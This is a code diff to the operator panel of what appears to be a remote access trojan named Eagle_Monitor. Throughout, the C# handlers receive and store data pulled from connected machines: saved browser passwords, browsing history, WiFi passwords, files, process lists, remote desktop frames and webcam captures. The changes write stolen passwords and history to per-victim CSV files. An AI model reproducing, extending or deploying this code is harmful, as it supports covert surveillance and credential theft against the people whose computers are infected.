@@ -1,10 +1,9 @@
-﻿using Eagle_Monitor.Forms;
-using Microsoft.VisualBasic;
-using NativeAPI;
-using System.Collections.Generic;
+﻿using System.Collections.Generic;
 using System.Drawing;
+using System.Linq;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using NativeAPI;
 using static Shared.Serializer;
 using static Shared.Utils;
 
@@ -21,34 +20,44 @@ namespace Eagle_Monitor.Clients
 
         public static async Task SetClient(Client C, Data Data, int Length)
         {
-            Task T = Task.Run(() => 
+            //Can cause high cpu usage
+            /*Task T = Task.Run(() => 
             {
                 NotificationForm n = new NotificationForm(Data.HWID, C.IP);
                 n.Text = "New client connected !";
                 n.titleLabel.Text = "New client connected !";
                 n.notificationLabel.Text = "IP : " + C.IP;
                 n.ShowDialog();
-            });
+            });*/
 
             C.HWID = Data.HWID;
-            Client.ClientDictionary.Add(C.IP, C);// was HWID
+            //C.CountryInfo = (IPAPI.IP)Data.DataReturn[1];
+            Client.ClientDictionary.Add(C.IP, C);
             List<string> ID = (List<string>)Data.DataReturn[0];
+            C.Username = ID[2];
             ListViewItem I = new ListViewItem(ID[0]);
-            System.IO.Directory.CreateDirectory(Utilities.GPath + "\\Clients\\" + C.HWID);
+            System.IO.Directory.CreateDirectory(Utilities.GPath + "\\Clients\\" + C.Username  + "@"+ C.HWID);
             ID[0] = C.IP;
+
+            int i = 0;
+
             foreach (string sub in ID)
             {
-                I.SubItems.Add(sub);
+                if(i != 8)
+                    I.SubItems.Add(sub);
+                i++;
             }
-            string country = Country.CountryInformation(Strings.Split(C.IP , ":")[0],ref C.CountryInfo);
-            if (country != "LOCALIP" && country != "NOCONNORLOCALIP")
-            {
-                I.ImageKey = country;             
-            }
-            else 
-            {
-                I.ImageKey = "icons8_black_flag_32.png";
-            }
+
+            string country = ID[8];
+            I.ImageKey = country;
+            /* if (country != "LOCALIP" && country != "NOCONNORLOCALIP")
+             {
+                 I.ImageKey = country;             
+             }
+             else 
+             {
+                 I.ImageKey = "icons8_black_flag_32.png";
+             }*/
             I.SubItems.Add(C.Port.ToString());
             C.ClientLV = I;
             StartForm.M.clientsListView.Items.Add(I);
@@ -61,8 +70,9 @@ namespace Eagle_Monitor.Clients
             C.CloseClient();
             if (Data.returnError.hasError == false)
             {
-                if (System.IO.Directory.Exists(Utilities.GPath + "\\Clients\\" + Data.HWID + "\\" + "Passwords") == false)
-                    System.IO.Directory.CreateDirectory(Utilities.GPath + "\\Clients\\" + Data.HWID + "\\" + "Passwords");
+                if (System.IO.Directory.Exists(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[Data.IP_Origin].Username + "@" + Data.HWID + "\\" + "Passwords") == false)
+                    System.IO.Directory.CreateDirectory(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[Data.IP_Origin].Username + "@" + Data.HWID + "\\" + "Passwords");
+
                 Client.ClientDictionary[Data.IP_Origin].passwordsForm.labelSize.Text = Utilities.Numeric2Bytes(Length);
                 Client.ClientDictionary[Data.IP_Origin].passwordsForm.loadingCircle1.Visible = false;
                 Client.ClientDictionary[Data.IP_Origin].passwordsForm.loadingCircle1.Active = false;
@@ -80,15 +90,18 @@ namespace Eagle_Monitor.Clients
                             I.SubItems.Add(o[2].ToString());
                             I.SubItems.Add(o[3].ToString());
                             Client.ClientDictionary[Data.IP_Origin].passwordsForm.passwordsListView.Items.Add(I);
+                            Task.Delay(50).Wait();
                         }
                     });
+
+                    await Task.Run(() => Utilities.ToCSV(Client.ClientDictionary[Data.IP_Origin].passwordsForm.passwordsListView, Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[Data.IP_Origin].Username + "@" + Data.HWID + "\\" + "Passwords\\Passwords.csv"));
+
                 }
                 catch (System.Exception)
                 {
                 }
                 finally
                 {
-                    await Task.Run(() => Utilities.ToCSV(Client.ClientDictionary[Data.IP_Origin].passwordsForm.passwordsListView, Utilities.GPath + "\\Clients\\" + Data.HWID + "\\" + "Passwords\\Passwords.csv"));
                     Shared.Utils.ClearMem();
                 }
             }
@@ -104,8 +117,8 @@ namespace Eagle_Monitor.Clients
             C.CloseClient();
             if (Data.returnError.hasError == false)
             {
-                if (System.IO.Directory.Exists(Utilities.GPath + "\\Clients\\" + Data.HWID + "\\" + "History") == false)
-                    System.IO.Directory.CreateDirectory(Utilities.GPath + "\\Clients\\" + Data.HWID + "\\" + "History");
+                if (System.IO.Directory.Exists(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[Data.IP_Origin].Username + "@" + Data.HWID + "\\" + "History") == false)
+                    System.IO.Directory.CreateDirectory(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[Data.IP_Origin].Username + "@" + Data.HWID + "\\" + "History");
                 Client.ClientDictionary[Data.IP_Origin].historyForm.labelSize.Text = Utilities.Numeric2Bytes(Length);
                 Client.ClientDictionary[Data.IP_Origin].historyForm.loadingCircle1.Visible = false;
                 Client.ClientDictionary[Data.IP_Origin].historyForm.loadingCircle1.Active = false;
@@ -124,15 +137,17 @@ namespace Eagle_Monitor.Clients
                             I.SubItems.Add(o[2].ToString());
                             I.SubItems.Add(o[3].ToString());
                             Client.ClientDictionary[Data.IP_Origin].historyForm.historyListView.Items.Add(I);
+                            Task.Delay(50).Wait();
                         }
                     });
+
+                    await Task.Run(() => Utilities.ToCSV(Client.ClientDictionary[Data.IP_Origin].historyForm.historyListView, Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[Data.IP_Origin].Username + "@" + Data.HWID + "\\" + "History\\History.csv"));
                 }
                 catch (System.Exception)
                 {
                 }
                 finally
-                {
-                    await Task.Run(() => Utilities.ToCSV(Client.ClientDictionary[Data.IP_Origin].historyForm.historyListView, Utilities.GPath + "\\Clients\\" + Data.HWID + "\\" + "History\\History.csv"));
+                {                  
                     Shared.Utils.ClearMem();
                 }
             }
@@ -148,8 +163,8 @@ namespace Eagle_Monitor.Clients
             C.CloseClient();
             if (Data.returnError.hasError == false)
             {
-                if (System.IO.Directory.Exists(Utilities.GPath + "\\Clients\\" + Data.HWID + "\\" + "WifiPasswords") == false)
-                    System.IO.Directory.CreateDirectory(Utilities.GPath + "\\Clients\\" + Data.HWID + "\\" + "WifiPasswords");
+                if (System.IO.Directory.Exists(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[Data.IP_Origin].Username + "@" + Data.HWID + "\\" + "WifiPasswords") == false)
+                    System.IO.Directory.CreateDirectory(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[Data.IP_Origin].Username + "@" + Data.HWID + "\\" + "WifiPasswords");
                 Client.ClientDictionary[Data.IP_Origin].wifiForm.labelSize.Text = Utilities.Numeric2Bytes(Length);
                 Client.ClientDictionary[Data.IP_Origin].wifiForm.loadingCircle1.Visible = false;
                 Client.ClientDictionary[Data.IP_Origin].wifiForm.loadingCircle1.Active = false;
@@ -168,13 +183,15 @@ namespace Eagle_Monitor.Clients
                             Client.ClientDictionary[Data.IP_Origin].wifiForm.wifiPasswordsListView.Items.Add(I);
                         }
                     });
+
+                    await Task.Run(() => Utilities.ToCSV(Client.ClientDictionary[Data.IP_Origin].wifiForm.wifiPasswordsListView, Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[Data.IP_Origin].Username + "@" + Data.HWID + "\\" + "WifiPasswords\\WifiPasswords.csv"));
+
                 }
                 catch (System.Exception)
                 {
                 }
                 finally
                 {
-                    await Task.Run(() => Utilities.ToCSV(Client.ClientDictionary[Data.IP_Origin].wifiForm.wifiPasswordsListView, Utilities.GPath + "\\Clients\\" + Data.HWID + "\\" + "WifiPasswords\\WifiPasswords.csv"));
                     Shared.Utils.ClearMem();
                 }
             }
@@ -211,14 +228,18 @@ namespace Eagle_Monitor.Clients
                         foreach (object[] o in ProcList)
                         {
                             ListViewItem I = new ListViewItem(o[0].ToString());
+
                             I.Name = o[1].ToString();
                             I.SubItems.Add(o[1].ToString());
                             I.SubItems.Add(o[2].ToString());
                             I.SubItems.Add(o[3].ToString());
+                            I.SubItems.Add(o[4].ToString());
+                            //MessageBox.Show(o[4].ToString());// I.SubItems.Add(o[4].ToString());
+
                             Client.ClientDictionary[Data.IP_Origin].processManagerForm.processesListView.Items.Add(I);
                             try
                             {
-                                byte[] b = (byte[])o[2];
+                                byte[] b = (byte[])o[5];
                                 ImgList.Images.Add(x.ToString(), Utilities.BytesToImage(b));
 
                             }
@@ -376,6 +397,7 @@ namespace Eagle_Monitor.Clients
                         listViewItem.Tag = "FOLDER";
                         listViewItem.Name = obj_[0].ToString();
                         listViewItem.ImageKey = x.ToString();
+                        Task.Delay(10).Wait();
                     }
 
                     x++;
@@ -391,6 +413,7 @@ namespace Eagle_Monitor.Clients
                         listViewItem.ImageKey = x.ToString();
                         Client.ClientDictionary[Data.IP_Origin].fileManagerForm.filesListView.Items.Add(listViewItem);
                         x++;
+                        Task.Delay(10).Wait();
                     }
 
                 });
@@ -429,8 +452,8 @@ namespace Eagle_Monitor.Clients
         public static async Task SetDownloadFile(Client C, Data Data, int Length) 
         {
             C.CloseClient();
-            if (System.IO.Directory.Exists(Utilities.GPath + "\\Clients\\" + Data.HWID + "\\" + "File") == false)
-                System.IO.Directory.CreateDirectory(Utilities.GPath + "\\Clients\\" + Data.HWID + "\\" + "File");
+            if (System.IO.Directory.Exists(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[Data.IP_Origin].Username + "@" + Data.HWID + "\\" + "File") == false)
+                System.IO.Directory.CreateDirectory(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[Data.IP_Origin].Username + "@" + Data.HWID + "\\" + "File");
             bool b = (bool)Data.DataReturn[0];
             try
             {
@@ -440,7 +463,7 @@ namespace Eagle_Monitor.Clients
                     {
                         Client.ClientDictionary[Data.IP_Origin].fileManagerForm.labelSize.Text = Utilities.Numeric2Bytes(Length);
                         Utilities.Log("Successful file downloaded : " + Data.DataReturn[1].ToString() + " from : " + Data.HWID + " with IP : " + Data.IP_Origin, Color.FromArgb(80, 68, 235));
-                        System.IO.File.WriteAllBytes(Utilities.GPath + "\\Clients\\" + Data.HWID + "\\File\\" + Utilities.SplitPath(Data.DataReturn[1].ToString()), Shared.Compressor.QuickLZ.Decompress((byte[])Data.DataReturn[2]));
+                        System.IO.File.WriteAllBytes(Utilities.GPath + "\\Clients\\" + Client.ClientDictionary[Data.IP_Origin].Username + "@" + Data.HWID + "\\File\\" + Utilities.SplitPath(Data.DataReturn[1].ToString()), Shared.Compressor.QuickLZ.Decompress((byte[])Data.DataReturn[2]));
                         Application.OpenForms[Utilities.SplitPath(Data.DataReturn[1].ToString())].Close();
                     });
                 }
@@ -514,7 +537,7 @@ namespace Eagle_Monitor.Clients
 
         public static async Task SetRemoteViewer(Client C, Data Data, int Length) 
         {
-           // C.CloseClient();      
+            // C.CloseClient();      
             try
             {
                 await Task.Run(() =>
@@ -530,11 +553,11 @@ namespace Eagle_Monitor.Clients
                 /*  if (Client.ClientDictionary[Data.IP_Origin].remoteDesktopForm.HasToCapture == true)
                   {
                       Data D = new Data();
-                      D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                      D.Type = Shared.PacketType.PLUGIN;
                       D.Plugin = Plugins.RemoteDesktop;
                       D.IP_Origin = toSend.IP;
                       D.HWID = toSend.HWID;
-                      D.DataReturn = new object[] { Shared.PacketTypes.PacketType.REMOTE_VIEW, toSend.remoteDesktopForm.desktopPictureBox.Width, toSend.remoteDesktopForm.desktopPictureBox.Height, toSend.remoteDesktopForm.quailitySiticoneTrackBar.Value, toSend.remoteDesktopForm.formatComboBox.Text };
+                      D.DataReturn = new object[] { Shared.PacketType.REMOTE_VIEW, toSend.remoteDesktopForm.desktopPictureBox.Width, toSend.remoteDesktopForm.desktopPictureBox.Height, toSend.remoteDesktopForm.quailitySiticoneTrackBar.Value, toSend.remoteDesktopForm.formatComboBox.Text };
                       await Task.Run(() => toSend.SendData(D.Serialize()));
                   }*/
                 if (Client.ClientDictionary[Data.IP_Origin].remoteDesktopForm.HasToCapture == false)
@@ -542,12 +565,13 @@ namespace Eagle_Monitor.Clients
                     toSend.remoteDesktopForm.loadingCircle1.Visible = false;
                     toSend.remoteDesktopForm.loadingCircle1.Active = false;
                     Data D = new Data();
-                    D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                    D.Type = Shared.PacketType.PLUGIN;
                     D.Plugin = Plugins.RemoteDesktop;
                     D.IP_Origin = toSend.IP;
                     D.HWID = toSend.HWID;
-                    D.DataReturn = new object[] { Shared.PacketTypes.PacketType.STOP_REMOTE_VIEW};
-                    await Task.Run(() => C.SendData(D.Serialize()));
+                    D.DataReturn = new object[] { Shared.PacketType.STOP_REMOTE_VIEW };
+                    //await Task.Run(() => C.SendData(D.Serialize()));
+                    C.SendData(D.Serialize());
                     C.CloseClient();
                 }
             }
@@ -555,6 +579,7 @@ namespace Eagle_Monitor.Clients
             {
                 MessageBox.Show(ex.ToString());
             }
+            //finally { C.CloseClient(); }
         }
     
         public static async Task SetManagedExecution(Client C, Data Data, int Length) 
@@ -652,11 +677,11 @@ namespace Eagle_Monitor.Clients
                 /*  if (Client.ClientDictionary[Data.IP_Origin].webCamForm.HasToCapture == true)
                   {
                       Data D = new Data();
-                      D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                      D.Type = Shared.PacketType.PLUGIN;
                       D.Plugin = Plugins.WebCam;
                       D.IP_Origin = toSend.IP;
                       D.HWID = toSend.HWID;
-                      D.Misc = new object[] { Shared.PacketTypes.PacketType.CAPTURE_CAMERA, Client.ClientDictionary[Data.IP_Origin].webCamForm.webCamComboBox.SelectedIndex, Client.ClientDictionary[Data.IP_Origin].webCamForm.quailitySiticoneTrackBar.Value };
+                      D.Misc = new object[] { Shared.PacketType.CAPTURE_CAMERA, Client.ClientDictionary[Data.IP_Origin].webCamForm.webCamComboBox.SelectedIndex, Client.ClientDictionary[Data.IP_Origin].webCamForm.quailitySiticoneTrackBar.Value };
                       await Task.Run(() => C.SendData(D.Serialize()));     
                   }*/
                 if (Client.ClientDictionary[Data.IP_Origin].webCamForm.HasToCapture == false)
@@ -664,11 +689,11 @@ namespace Eagle_Monitor.Clients
                     toSend.webCamForm.loadingCircle1.Visible = false;
                     toSend.webCamForm.loadingCircle1.Active = false;
                     Data D = new Data();
-                    D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                    D.Type = Shared.PacketType.PLUGIN;
                     D.Plugin = Plugins.WebCam;
                     D.IP_Origin = toSend.IP;
                     D.HWID = toSend.HWID;
-                    D.DataReturn = new object[] { Shared.PacketTypes.PacketType.STOP_CAPTURE_CAMERA, Client.ClientDictionary[Data.IP_Origin].webCamForm.webCamComboBox.SelectedIndex, Client.ClientDictionary[Data.IP_Origin].webCamForm.quailitySiticoneTrackBar.Value };
+                    D.DataReturn = new object[] { Shared.PacketType.STOP_CAPTURE_CAMERA, Client.ClientDictionary[Data.IP_Origin].webCamForm.webCamComboBox.SelectedIndex, Client.ClientDictionary[Data.IP_Origin].webCamForm.quailitySiticoneTrackBar.Value };
                     await Task.Run(() => C.SendData(D.Serialize()));
                     C.CloseClient();
                 }
@@ -679,11 +704,11 @@ namespace Eagle_Monitor.Clients
                 toSend.webCamForm.loadingCircle1.Visible = false;
                 toSend.webCamForm.loadingCircle1.Active = false;
                 Data D = new Data();
-                D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                D.Type = Shared.PacketType.PLUGIN;
                 D.Plugin = Plugins.WebCam;
                 D.IP_Origin = toSend.IP;
                 D.HWID = toSend.HWID;
-                D.DataReturn = new object[] { Shared.PacketTypes.PacketType.STOP_CAPTURE_CAMERA, Client.ClientDictionary[Data.IP_Origin].webCamForm.webCamComboBox.SelectedIndex, Client.ClientDictionary[Data.IP_Origin].webCamForm.quailitySiticoneTrackBar.Value };
+                D.DataReturn = new object[] { Shared.PacketType.STOP_CAPTURE_CAMERA, Client.ClientDictionary[Data.IP_Origin].webCamForm.webCamComboBox.SelectedIndex, Client.ClientDictionary[Data.IP_Origin].webCamForm.quailitySiticoneTrackBar.Value };
                 await Task.Run(() => C.SendData(D.Serialize()));
                 C.CloseClient();
                 //MessageBox.Show(ex.ToString());
@@ -726,6 +751,63 @@ namespace Eagle_Monitor.Clients
                 }
             }
             else 
+            {
+                Utilities.Log(Data.HWID + " with IP : " + Data.IP_Origin + " : Error from client : " + Data.returnError.errorDescription, Color.Red);
+            }
+        }
+
+
+        public static async Task SetComputerInformation(Client C, Data Data, int Length)
+        {
+            C.CloseClient();
+            if (Data.returnError.hasError == false)
+            {
+                try
+                {
+                    Client.ClientDictionary[Data.IP_Origin].informationForm.featuresListView.Items.Clear();
+                    Client.ClientDictionary[Data.IP_Origin].informationForm.systemInformationListView.Items.Clear();
+                    await Task.Run(() =>
+                    {
+                        //string CPUInformation = Data.DataReturn[0].ToString();
+
+                        Dictionary<string, string> infoList = (Dictionary<string, string>)Data.DataReturn[0];
+
+                        string[] SplitInformation = infoList["CPU"].Split('\n');
+
+                        Client.ClientDictionary[Data.IP_Origin].informationForm.vendorLabel.Text = SplitInformation[0];
+                        Client.ClientDictionary[Data.IP_Origin].informationForm.brandLabel.Text = SplitInformation[1];
+                        ListViewItem item;
+                        for (int i = 2; i < SplitInformation.Length - 1; i++) 
+                        {
+                            string[] SplitFeature = SplitInformation[i].Split(' ');
+                            item = new ListViewItem(SplitFeature[0]);
+
+                            if (SplitFeature[1] == "1") 
+                                item.SubItems.Add("Yes");
+                            else
+                                item.SubItems.Add("No");
+
+                            Client.ClientDictionary[Data.IP_Origin].informationForm.featuresListView.Items.Add(item);
+
+                        }
+
+                        for (int i = 1; i < infoList.Count; i++) 
+                        {
+                            var info = infoList.ElementAt(i);
+                            item = new ListViewItem(info.Key);
+                            item.SubItems.Add(info.Value);
+                            Client.ClientDictionary[Data.IP_Origin].informationForm.systemInformationListView.Items.Add(item);
+
+                        }
+
+                    });
+                }
+                catch (System.Exception ex)
+                {
+                    MessageBox.Show(ex.ToString());
+                }
+            }
+            else
             {
                 Utilities.Log(Data.HWID + " with IP : " + Data.IP_Origin + " : Error from client : " + Data.returnError.errorDescription, Color.Red);
             }
